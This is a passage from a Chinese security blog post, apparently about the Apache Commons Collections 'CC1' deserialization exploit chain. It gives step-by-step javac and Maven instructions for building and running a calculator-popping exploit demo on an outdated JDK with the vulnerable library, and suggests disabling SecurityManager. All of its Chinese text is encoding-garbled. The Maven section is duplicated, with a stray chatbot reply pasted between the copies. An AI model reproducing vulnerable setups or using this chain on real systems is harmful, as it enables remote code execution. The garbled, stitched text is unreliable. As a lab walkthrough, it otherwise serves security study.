ç»•è¿‡ç›´æ¥è°ƒç”¨é™åˆ¶ï¼›</li><li>æœ€ç»ˆæ•ˆæœç­‰ä»·äºï¼š</li></ol><pre tabindex=0><code>Runtime.getRuntime().exec(&#34;calc&#34;);
</code></pre><h1 id=äº”æµ‹è¯•>äº”ã€æµ‹è¯•<a hidden class=anchor aria-hidden=true href=#äº”æµ‹è¯•>#</a></h1><h2 id=æ–¹æ³•ä¸€æ‰‹åŠ¨ç¼–è¯‘ä¸è¿è¡Œ>ğŸ“Œæ–¹æ³•ä¸€ï¼š<strong>æ‰‹åŠ¨ç¼–è¯‘ä¸è¿è¡Œ</strong><a hidden class=anchor aria-hidden=true href=#æ–¹æ³•ä¸€æ‰‹åŠ¨ç¼–è¯‘ä¸è¿è¡Œ>#</a></h2><p>&ldquo;âš ï¸ æ³¨æ„ï¼šæ­¤æ¼æ´åˆ©ç”¨éœ€è¦ç›®æ ‡ç³»ç»Ÿå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼ˆå³å­˜åœ¨å¯ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥çš„ä»£ç ï¼‰ï¼Œä»…æµ‹è¯•ä»£ç æœ¬èº«ä¸åŒ…å«æ¼æ´ã€‚&rdquo;</p><p>âœ… ç¯å¢ƒæ£€æŸ¥</p><table><thead><tr><th>é¡¹ç›®</th><th>è¦æ±‚</th></tr></thead><tbody><tr><td><strong>æ“ä½œç³»ç»Ÿ</strong></td><td>Windows / macOS / Linuxï¼ˆå‘½ä»¤ç•¥æœ‰ä¸åŒï¼‰</td></tr><tr><td><strong>Java ç‰ˆæœ¬</strong></td><td>Java ç‰ˆæœ¬JDK â‰¤ 8u71ï¼ˆæ¼æ´ä¿®å¤ç‰ˆæœ¬ä¸ºJDK 8u72åŠæ›´é«˜ç‰ˆæœ¬ï¼Œæ¨èä½¿ç”¨JDK 8u66æˆ–æ›´æ—©ç‰ˆæœ¬ï¼‰å¯é€šè¿‡ <code>java -version</code> æŸ¥çœ‹</td></tr><tr><td><strong>ä¾èµ–åº“</strong></td><td>ä¾èµ–åº“commons-collections-3.2.1.jarï¼ˆâš ï¸å¿…é¡»æ˜¯3.2.1æˆ–æ›´æ—©ï¼Œ3.2.2åŠä»¥ä¸Šå·²ä¿®å¤æ­¤æ¼æ´ï¼‰ï¼ˆâš ï¸å¿…é¡»æ˜¯ 3.2.1 æˆ–æ›´æ—©ï¼‰</td></tr></tbody></table><blockquote><p>ğŸ’¡ å¦‚æœä½ ä¸ç¡®å®š Java ç‰ˆæœ¬æ˜¯å¦æ”¯æŒï¼Œå¯ä»¥å…ˆå°è¯•è¿è¡Œï¼Œå¦‚æœæ²¡å¼¹è®¡ç®—å™¨ï¼Œå¾ˆå¯èƒ½æ˜¯ç‰ˆæœ¬å¤ªé«˜ï¼ˆæ¼æ´å·²ä¿®å¤ï¼‰ã€‚</p></blockquote><hr><p>ğŸ“¥ ç¬¬ä¸€æ­¥ï¼šä¸‹è½½ä¾èµ–åº“</p><p>æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®ï¼š</p><pre tabindex=0><code>https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/
</code></pre><p>ä¸‹è½½æ–‡ä»¶ï¼š</p><pre tabindex=0><code>commons-collections-3.2.1.jar
</code></pre><p>å°†å®ƒä¿å­˜åˆ°ä½ çš„å·¥ä½œç›®å½•ï¼Œæ¯”å¦‚ï¼š</p><pre tabindex=0><code>/exploit-demo/commons-collections-3.2.1.jar
</code></pre><p>ğŸ“‚ ç¬¬äºŒæ­¥ï¼šåˆ›å»ºé¡¹ç›®ç›®å½•ç»“æ„</p><p>æ‰“å¼€ç»ˆç«¯ï¼ˆWindows ç”¨ CMD/PowerShellï¼ŒmacOS/Linux ç”¨ Terminalï¼‰ï¼Œæ‰§è¡Œï¼š</p><pre tabindex=0><code>mkdir exploit-demo
cd exploit-demo
</code></pre><p>ç„¶ååˆ›å»ºæºç ç›®å½•ï¼š</p><pre tabindex=0><code>mkdir -p src/com/example
</code></pre><p>æœ€ç»ˆç›®å½•ç»“æ„åº”ä¸ºï¼š</p><pre tabindex=0><code>exploit-demo/
â”œâ”€â”€ commons-collections-3.2.1.jar
â””â”€â”€ src/
    â””â”€â”€ com/
        â””â”€â”€ example/
            â””â”€â”€ CC1_Exploit.java   â† ä½ è¦æ”¾çš„ä»£ç 
</code></pre><p>ğŸ“ ç¬¬ä¸‰æ­¥ï¼šä¿å­˜ä»£ç åˆ°æ–‡ä»¶</p><p>ç”¨ä»»æ„æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚ VS Codeã€Notepad++ã€vimï¼‰åˆ›å»ºæ–‡ä»¶ï¼š</p><pre tabindex=0><code>src/com/example/CC1_Exploit.java
</code></pre><p>æŠŠä¹‹å‰ç»™ä½ çš„ <strong>â€œå®Œæ•´å¯è¿è¡Œç¤ºä¾‹â€</strong> ç²˜è´´è¿›å»ã€‚</p><blockquote><p>âš ï¸ æ³¨æ„ï¼šå¦‚æœä½ ç”¨çš„æ˜¯ <strong>macOS æˆ– Linux</strong>ï¼Œè¯·ä¿®æ”¹æœ€åä¸€è¡Œå‘½ä»¤ï¼š</p></blockquote><pre tabindex=0><code>// Windows
new Object[]{&#34;calc.exe&#34;}

// macOS
new Object[]{&#34;open&#34;, &#34;/Applications/Calculator.app&#34;}

// Linux (GNOME)
new Object[]{&#34;gnome-calculator&#34;}
</code></pre><p>ğŸ”§ ç¬¬å››æ­¥ï¼šç¼–è¯‘ Java ä»£ç </p><p>å›åˆ°ç»ˆç«¯ï¼Œåœ¨ <code>exploit-demo</code> ç›®å½•ä¸‹æ‰§è¡Œç¼–è¯‘å‘½ä»¤ï¼š</p><p>Windowsï¼ˆCMD/PowerShellï¼‰ï¼š</p><pre tabindex=0><code>javac -cp &#34;.;commons-collections-3.2.1.jar&#34; src/com/example/CC1_Exploit.java
</code></pre><p>macOS / Linuxï¼ˆBash/Zshï¼‰ï¼š</p><pre tabindex=0><code>javac -cp &#34;.:commons-collections-3.2.1.jar&#34; src/com/example/CC1_Exploit.java
</code></pre><p>âœ… å¦‚æœæ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜ç¼–è¯‘æˆåŠŸï¼ä½ ä¼šçœ‹åˆ°ç”Ÿæˆäº† <code>.class</code> æ–‡ä»¶ï¼š</p><pre tabindex=0><code>src/com/example/CC1_Exploit.class
</code></pre><p>â–¶ï¸ ç¬¬äº”æ­¥ï¼šè¿è¡Œç¨‹åºï¼ˆè§¦å‘ååºåˆ—åŒ–ï¼‰</p><p>ç»§ç»­åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p><p>Windowsï¼š</p><pre tabindex=0><code>java -cp &#34;.;commons-collections-3.2.1.jar;src&#34; com.example.CC1_Exploit
</code></pre><p>macOS / Linuxï¼š</p><pre tabindex=0><code>java -cp &#34;.:commons-collections-3.2.1.jar:src&#34; com.example.CC1_Exploit
</code></pre><p>âŒ å¦‚æœæ²¡å¼¹å‡ºè®¡ç®—å™¨ï¼Ÿæ’æŸ¥æŒ‡å—</p><table><thead><tr><th>é—®é¢˜</th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>æ²¡ååº”ï¼Œä¹Ÿæ²¡æŠ¥é”™</strong></td><td>å¾ˆå¯èƒ½ JDK ç‰ˆæœ¬å¤ªé«˜ï¼ˆâ‰¥8u72ï¼‰ï¼Œè¯·æ¢ä½ç‰ˆæœ¬ JDK</td></tr><tr><td><strong>ClassNotFoundException</strong></td><td>æ£€æŸ¥ <code>-cp</code> è·¯å¾„æ˜¯å¦åŒ…å« <code>commons-collections-3.2.1.jar</code> å’Œ <code>src</code></td></tr><tr><td><strong>AccessControlException</strong></td><td>æŸäº›å®‰å…¨ç­–ç•¥é™åˆ¶åå°„ï¼Œå°è¯•å…³é—­ SecurityManagerï¼ˆä¸€èˆ¬å¼€å‘ç¯å¢ƒæ²¡é—®é¢˜ï¼‰</td></tr><tr><td><strong>macOS/Liunx å‘½ä»¤æ— æ•ˆ</strong></td><td>ç¡®è®¤å‘½ä»¤æ˜¯å¦å­˜åœ¨ï¼Œæ¯”å¦‚ <code>which gnome-calculator</code></td></tr><tr><td><strong>æç¤º â€œsun.reflect.annotation.AnnotationInvocationHandlerâ€ not found</strong></td><td>è¯´æ˜ JDK ç‰ˆæœ¬è¿‡ä½ï¼ˆå¦‚ JDK 6ï¼‰æˆ–è¿‡é«˜ï¼ˆæ¨¡å—åŒ–åè·¯å¾„å˜åŒ–ï¼‰ï¼Œå»ºè®®ç”¨ <strong>JDK 8u66</strong></td></tr></tbody></table><p>âœ… ç¡®ä¿<code>innerMap</code>è‡³å°‘æœ‰ä¸€ä¸ªentryï¼ˆ<code>innerMap.put("value", "anything");</code>ï¼‰ï¼Œå¦åˆ™ä¸ä¼šè§¦å‘è½¬æ¢ã€‚</p><h2 id=æ–¹æ³•äºŒä½¿ç”¨-maven-è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•>ğŸ“Œæ–¹æ³•äºŒï¼š<strong>ä½¿ç”¨ Maven è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•</strong><a hidden class=anchor aria-hidden=true href=#æ–¹æ³•äºŒä½¿ç”¨-maven-è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•>#</a></h2><p>ä½¿ç”¨æ„å»ºå·¥å…·ï¼ˆå¦‚ Mavenï¼‰æ¥ç®¡ç†ä¾èµ–å’Œç¼–è¯‘è¿‡ç¨‹æ˜¯æ ‡å‡†åšæ³•ã€‚è¿™ç§æ–¹æ³•æ›´åŠ é«˜æ•ˆå’Œè§„èŒƒï¼Œå¯ä»¥é¿å…æ‰‹åŠ¨ç®¡ç† JAR åŒ…å’Œå¤æ‚çš„ classpath è®¾ç½®</p><p>âœ… <strong>å‰ææ¡ä»¶æ£€æŸ¥</strong></p><table><thead><tr><th>é¡¹ç›®</th><th>è¦æ±‚</th><th>å¦‚ä½•æ£€æŸ¥</th></tr></thead><tbody><tr><td><strong>æ“ä½œç³»ç»Ÿ</strong></td><td>Windows / macOS / Linux</td><td>-</td></tr><tr><td><strong>Java ç‰ˆæœ¬</strong></td><td>JDK â‰¤ 8u71 (æ¨è <strong>JDK 8u66</strong> æˆ–æ›´æ—©ç‰ˆæœ¬)</td><td>java -version</td></tr><tr><td><strong>Maven</strong></td><td>3.0 æˆ–æ›´é«˜ç‰ˆæœ¬</td><td>mvn -version</td></tr></tbody></table><p>ğŸ’¡ å¦‚æœä½ æ²¡æœ‰å®‰è£… Mavenï¼Œè¯·å…ˆä» <a href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fmaven.apache.org%2Fdownload.cgi">Maven å®˜ç½‘</a> ä¸‹è½½å¹¶æ ¹æ®å…¶æŒ‡å—è¿›è¡Œå®‰è£…é…ç½®</p><hr><p>ğŸ“‚ <strong>ç¬¬ä¸€æ­¥ï¼šåˆ›å»º Maven é¡¹ç›®</strong></p><ol><li><p>æ‰“å¼€ä½ çš„ç»ˆç«¯ï¼ˆCMD, PowerShell, Terminalï¼‰ã€‚</p></li><li><p>è¿›å…¥ä¸€ä¸ªä½ å¸Œæœ›å­˜æ”¾é¡¹ç›®çš„å·¥ä½œç›®å½•ï¼ˆä¾‹å¦‚ cd C:\Users\YourUser\Documentsï¼‰ã€‚</p></li><li><p>è¿è¡Œä»¥ä¸‹ Maven å‘½ä»¤æ¥é€šè¿‡æ¨¡æ¿åˆ›å»ºä¸€ä¸ªæ–°çš„ Java é¡¹ç›®ï¼š</p><p>mvn archetype:generate -DgroupId=com.example.cc1 -DartifactId=cc1-exploit-demo -DpackageName=com.example.cc1 -Dversion=1.0-SNAPSHOT -DinteractiveMode=false</p></li></ol><ul><li>è¿™ä¸ªå‘½ä»¤ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåä¸º cc1-exploit-demo çš„æ–‡ä»¶å¤¹ï¼Œå¹¶ç”Ÿæˆæ ‡å‡†çš„ Maven é¡¹ç›®ç»“æ„ã€‚</li></ul><p>â€‹ è¿›å…¥é¡¹ç›®ç›®å½•ï¼š</p><p>â€‹ cd cc1-exploit-demo</p><p>è¿™æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„æƒ³æ³•ï¼ä¸ºä½ çš„æ–‡æ¡£å¢åŠ ä¸€ä¸ªä½¿ç”¨ Maven çš„æµ‹è¯•æµç¨‹ï¼Œä¼šè®©å®ƒæ˜¾å¾—æ›´åŠ ä¸“ä¸šå’Œè´´è¿‘çœŸå®å¼€å‘åœºæ™¯ã€‚</p><p>æˆ‘çš„å»ºè®®æ˜¯ï¼š<strong>ä¸è¦åˆ é™¤ä½ åŸæ¥çš„æ‰‹åŠ¨æµ‹è¯•æ–¹æ³•ï¼Œè€Œæ˜¯åœ¨å…¶åå¢åŠ ä¸€èŠ‚ï¼Œä½œä¸ºâ€œæ–¹æ³•äºŒï¼šä½¿ç”¨ Maven è‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•â€ã€‚</strong></p><p>è¿™æ ·åšæœ‰å‡ ä¸ªå¥½å¤„ï¼š</p><ol><li><strong>å¾ªåºæ¸è¿›</strong>ï¼šæ‰‹åŠ¨æ–¹æ³•èƒ½è®©åˆå­¦è€…æ›´å¥½åœ°ç†è§£ javac å’Œ classpath çš„åº•å±‚åŸç†ã€‚</li><li><strong>è¦†ç›–å…¨é¢</strong>ï¼šMaven æ–¹æ³•å±•ç¤ºäº†ç°ä»£ Java é¡¹ç›®çš„æ ‡å‡†å·¥ä½œæµï¼Œæ›´å…·å®ç”¨æ€§ã€‚</li><li><strong>æ»¡è¶³ä¸åŒè¯»è€…</strong>ï¼šæœ‰äº›è¯»è€…å¯èƒ½æ²¡æœ‰å®‰è£… Mavenï¼Œä»–ä»¬ä¾ç„¶å¯ä»¥ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•ã€‚</li></ol><p>ä¸‹é¢ï¼Œæˆ‘ä¸ºä½ å®Œæ•´åœ°æ¢³ç†äº†<strong>ä½¿ç”¨ Maven è¿›è¡Œæµ‹è¯•çš„å…¨éƒ¨æµç¨‹</strong>ã€‚ä½ å¯ä»¥å°†è¿™éƒ¨åˆ†å†…å®¹ç›´æ¥æ·»åŠ åˆ°ä½ çš„æ–‡æ¡£ä¸­ã€‚</p><hr><h3 id=æ–¹æ³•äºŒä½¿ç”¨-maven-è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•-1><strong>æ–¹æ³•äºŒï¼šä½¿ç”¨ Maven è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•</strong><a hidden class=anchor aria-hidden=true href=#æ–¹æ³•äºŒä½¿ç”¨-maven-è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºä¸æµ‹è¯•-1>#</a></h3><p>å¯¹äºç°ä»£Javaé¡¹ç›®å¼€å‘ï¼Œä½¿ç”¨æ„å»ºå·¥å…·ï¼ˆå¦‚ Mavenï¼‰æ¥ç®¡ç†ä¾èµ–å’Œç¼–è¯‘è¿‡ç¨‹æ˜¯æ ‡å‡†åšæ³•ã€‚è¿™ç§æ–¹æ³•æ›´åŠ é«˜æ•ˆå’Œè§„èŒƒï¼Œå¯ä»¥é¿å…æ‰‹åŠ¨ç®¡ç† JAR åŒ…å’Œå¤æ‚çš„ classpath è®¾ç½®ã€‚</p><p>âœ… <strong>å‰ææ¡ä»¶æ£€æŸ¥</strong></p><table><thead><tr><th>é¡¹ç›®</th><th>è¦æ±‚</th><th>å¦‚ä½•æ£€æŸ¥</th></tr></thead><tbody><tr><td><strong>æ“ä½œç³»ç»Ÿ</strong></td><td>Windows / macOS / Linux</td><td>-</td></tr><tr><td><strong>Java ç‰ˆæœ¬</strong></td><td>JDK â‰¤ 8u71 (æ¨è <strong>JDK 8u66</strong> æˆ–æ›´æ—©ç‰ˆæœ¬)</td><td>java -version</td></tr><tr><td><strong>Maven</strong></td><td>3.0 æˆ–æ›´é«˜ç‰ˆæœ¬</td><td>mvn -version</td></tr></tbody></table><blockquote><p>ğŸ’¡ å¦‚æœä½ æ²¡æœ‰å®‰è£… Mavenï¼Œè¯·å…ˆä» <a href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fmaven.apache.org%2Fdownload.cgi">Maven å®˜ç½‘</a> ä¸‹è½½å¹¶æ ¹æ®å…¶æŒ‡å—è¿›è¡Œå®‰è£…é…ç½®ã€‚</p></blockquote><hr><p>ğŸ“‚ <strong>ç¬¬ä¸€æ­¥ï¼šåˆ›å»º Maven é¡¹ç›®</strong></p><ol><li><p>æ‰“å¼€ä½ çš„ç»ˆç«¯ï¼ˆCMD, PowerShell, Terminalï¼‰ã€‚</p></li><li><p>è¿›å…¥ä¸€ä¸ªä½ å¸Œæœ›å­˜æ”¾é¡¹ç›®çš„å·¥ä½œç›®å½•ï¼ˆä¾‹å¦‚ cd C:\Users\YourUser\Documentsï¼‰ã€‚</p></li><li><p>è¿è¡Œä»¥ä¸‹ Maven å‘½ä»¤æ¥é€šè¿‡æ¨¡æ¿åˆ›å»ºä¸€ä¸ªæ–°çš„ Java é¡¹ç›®ï¼š</p><p>codeBash</p><pre tabindex=0><code>mvn archetype:generate -DgroupId=com.example.cc1 -DartifactId=cc1-exploit-demo -DpackageName=com.example.cc1 -Dversion=1.0-SNAPSHOT -DinteractiveMode=false
</code></pre><ul><li>è¿™ä¸ªå‘½ä»¤ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåä¸º cc1-exploit-demo çš„æ–‡ä»¶å¤¹ï¼Œå¹¶ç”Ÿæˆæ ‡å‡†çš„ Maven é¡¹ç›®ç»“æ„ã€‚</li></ul></li><li><p>è¿›å…¥é¡¹ç›®ç›®å½•ï¼š</p><p>codeBash</p><pre tabindex=0><code>cd cc1-exploit-demo
</code></pre></li></ol><p>ä½ ç°åœ¨çœ‹åˆ°çš„ç›®å½•ç»“æ„åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><p>cc1-exploit-demo/
â”œâ”€â”€ src/
â”‚ â”œâ”€â”€ main/
â”‚ â”‚ â””â”€â”€ java/
â”‚ â”‚ â””â”€â”€ com/
â”‚ â”‚ â””â”€â”€ example/
â”‚ â”‚ â””â”€â”€ cc1/
â”‚ â”‚ â””â”€â”€ App.java &lt;&ndash; æ¨¡æ¿è‡ªå¸¦çš„æ–‡ä»¶
â”‚ â””â”€â”€ test/
â”‚ â””â”€â”€ &mldr;
â””â”€â”€ pom.xml &lt;&ndash; é¡¹ç›®çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶</p><hr><p>ğŸ“ <strong>ç¬¬äºŒæ­¥ï¼šé…ç½® pom.xml æ–‡ä»¶</strong></p><p>pom.xml æ˜¯ Maven é¡¹ç›®çš„â€œå¿ƒè„â€ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜é¡¹ç›®ä¾èµ–å’Œé…ç½®ã€‚</p><ol><li>ç”¨å¦‚ VS Code, Notepad++, IntelliJ IDEA æ‰“å¼€é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ pom.xml æ–‡ä»¶ã€‚</li><li><strong>å°†æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹æ›¿æ¢ä¸º</strong>ä»¥ä¸‹é…ç½®ï¼š</li></ol><p><project xmlns=http://maven.apache.org/POM/4.0.0 xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xsi:schemalocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"><modelversion>4.0.0</modelversion></p><pre><code>&lt;groupId&gt;com.example.cc1&lt;/groupId&gt;
&lt;artifactId&gt;cc1-exploit-demo&lt;/artifactId&gt;
&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;

&lt;properties&gt;
    &lt;!-- å¼ºåˆ¶ä½¿ç”¨ Java 8 å’Œ UTF-8 ç¼–ç  --&gt;
    &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;
    &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
&lt;/properties&gt;

&lt;dependencies&gt;
    &lt;!-- 
        æ ¸å¿ƒä¾èµ–ï¼šcommons-collections 3.2.1 ç‰ˆæœ¬
        Maven ä¼šè‡ªåŠ¨ä»ä¸­å¤®ä»“åº“ä¸‹è½½è¿™ä¸ª JAR åŒ…
    --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;commons-collections&lt;/groupId&gt;
        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
        &lt;version&gt;3.2.1&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;

&lt;build&gt;
    &lt;plugins&gt;
        &lt;!-- æ·»åŠ  exec-maven-plugin æ’ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬ç›´æ¥è¿è¡Œä¸»ç±» --&gt;
        &lt;plugin&gt;
            &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
            &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;
            &lt;version&gt;3.1.0&lt;/version&gt;
            &lt;configuration&gt;
                &lt;!-- æŒ‡å®šè¦è¿è¡Œçš„ä¸»ç±» --&gt;
                &lt;mainClass&gt;com.example.cc1.CC1_Exploit&lt;/mainClass&gt;
            &lt;/configuration&gt;
        &lt;/plugin&gt;
    &lt;/plugins&gt;
&lt;/build&gt;
</code></pre></project><ul><li><strong>å…³é”®ç‚¹</strong>ï¼š<ul><li><dependency>éƒ¨åˆ†ä¼šè‡ªåŠ¨ä¸‹è½½ commons-collections-3.2.1.jarã€‚</li><li><properties>éƒ¨åˆ†ç¡®ä¿äº†é¡¹ç›®ä¼šä½¿ç”¨ Java 8 è¿›è¡Œç¼–è¯‘ã€‚</li><li>exec-maven-plugin æ’ä»¶è®©æˆ‘ä»¬èƒ½ç”¨ä¸€ä¸ªç®€å•çš„å‘½ä»¤æ¥è¿è¡Œä»£ç ã€‚</li></ul></li></ul><hr><p>ğŸ’» <strong>ç¬¬ä¸‰æ­¥ï¼šæ”¾ç½®å¹¶ä¿®æ”¹æ¼æ´åˆ©ç”¨ä»£ç </strong></p><ol><li>åˆ é™¤æ¨¡æ¿ç”Ÿæˆçš„ App.java æ–‡ä»¶ï¼š<ul><li>src/main/java/com/example/cc1/App.java</li></ul></li><li>åœ¨ç›¸åŒçš„ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ Java æ–‡ä»¶ CC1_Exploit.javaï¼š<ul><li>src/main/java/com/example/cc1/CC1_Exploit.java</li></ul></li><li>å°†ä½ çš„å®Œæ•´æ¼æ´åˆ©ç”¨ä»£ç ç²˜è´´åˆ°è¿™ä¸ªæ–°æ–‡ä»¶ä¸­ã€‚</li><li><strong>é‡è¦</strong>ï¼šç¡®ä¿ä»£ç çš„ package å£°æ˜ä¸ä½ çš„é¡¹ç›®è·¯å¾„ä¸€è‡´ã€‚æ–‡ä»¶çš„ç¬¬ä¸€è¡Œåº”è¯¥æ˜¯ï¼š</li></ol><p>package com.example.cc1;</p><ol><li><strong>å†æ¬¡ç¡®è®¤</strong>ï¼šæ ¹æ®ä½ çš„æ“ä½œç³»ç»Ÿï¼Œä¿®æ”¹ä»£ç ä¸­è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚<ul><li><strong>Windows</strong>: new Object[]{&ldquo;calc.exe&rdquo;}</li><li><strong>macOS</strong>: new Object[]{&ldquo;open&rdquo;, &ldquo;-a&rdquo;, &ldquo;Calculator&rdquo;}</li><li><strong>Linux (GNOME)</strong>: new Object[]{&ldquo;gnome-calculator&rdquo;}</li></ul></li></ol><p>â–¶ï¸ <strong>ç¬¬å››æ­¥ï¼šç¼–è¯‘å¹¶è¿è¡Œç¨‹åº</strong></p><p>ç°åœ¨ï¼Œæ‰€æœ‰å‡†å¤‡å·¥ä½œéƒ½å·²å°±ç»ªã€‚</p><ol><li><p>å›åˆ°ä½ çš„ç»ˆç«¯ï¼Œç¡®ä¿ä½ ä»ç„¶åœ¨ cc1-exploit-demo é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ã€‚</p></li><li><p><strong>ç¼–è¯‘é¡¹ç›®</strong>ï¼šè¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚Maven ä¼šè‡ªåŠ¨ä¸‹è½½ä¾èµ–å¹¶ç¼–è¯‘ä½ çš„ä»£ç ã€‚</p><p>mvn compile</p></li></ol><p>â€‹ 3.<strong>è¿è¡Œç¨‹åºï¼ˆè§¦å‘æ¼æ´ï¼‰</strong>ï¼šè¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚</p><p>â€‹ mvn exec:java</p><hr><p>âŒ <strong>å¦‚æœæ²¡å¼¹å‡ºè®¡ç®—å™¨ï¼Ÿæ’æŸ¥æŒ‡å—</strong></p><table><thead><tr><th>é—®é¢˜</th><th>å¯èƒ½åŸå› ä¸è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>mvn å‘½ä»¤æœªæ‰¾åˆ°</strong></td><td>Maven æœªå®‰è£…æˆ–æœªé…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ PATH ä¸­ã€‚</td></tr><tr><td><strong>æ„å»ºå¤±è´¥ (BUILD FAILURE)</strong></td><td>ä»”ç»†é˜…è¯»é”™è¯¯ä¿¡æ¯ã€‚é€šå¸¸æ˜¯ pom.xml æ–‡ä»¶æœ‰è¯­æ³•é”™è¯¯ï¼Œæˆ–è€…ç½‘ç»œé—®é¢˜å¯¼è‡´ä¾èµ–ä¸‹è½½å¤±è´¥ã€‚</td></tr><tr><td><strong>ç¨‹åºè¿è¡Œä½†æ— ååº”</strong></td><td>99% çš„å¯èƒ½æ˜¯ä½ çš„ <strong>JDK ç‰ˆæœ¬è¿‡é«˜</strong>ï¼ˆ> 8u71ï¼‰ï¼Œæ¼æ´å·²è¢«ä¿®å¤ã€‚è¯·åŠ¡å¿…åˆ‡æ¢åˆ°å­˜åœ¨æ¼æ´çš„æ—§ç‰ˆæœ¬ JDKã€‚</td></tr><tr><td><strong>ClassNotFoundException</strong></td><td>æ£€æŸ¥ pom.xml ä¸­çš„ä¾èµ–æ˜¯å¦æ­£ç¡®ã€‚è¿è¡Œ mvn clean install å¼ºåˆ¶é‡æ–°æ„å»ºã€‚</td></tr><tr><td><strong>ä¸»ç±»æ‰¾ä¸åˆ°é”™è¯¯</strong></td><td>æ£€æŸ¥ pom.xml ä¸­ exec-maven-plugin çš„ <mainclass>é…ç½®æ˜¯å¦ä¸ä½ çš„ä»£ç åŒ…åå’Œç±»åå®Œå…¨ä¸€è‡´ã€‚</td></tr></tbody></table></div><footer class=post-footer><ul class=post-tags><li><a href=http://ljj1992.fun/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>ç½‘ç»œå®‰å…¨</a></li><li><a href=http://ljj1992.fun/tags/%E6%BC%8F%E6%B4%9E/>æ¼æ´</a></li><li><a href=http://ljj1992.fun/tags/%E6%94%BB%E5%87%BB%E9%93%BE/>æ”»å‡»é“¾</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=http://ljj1992.fun/>starå¾çš„åšå®¢</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>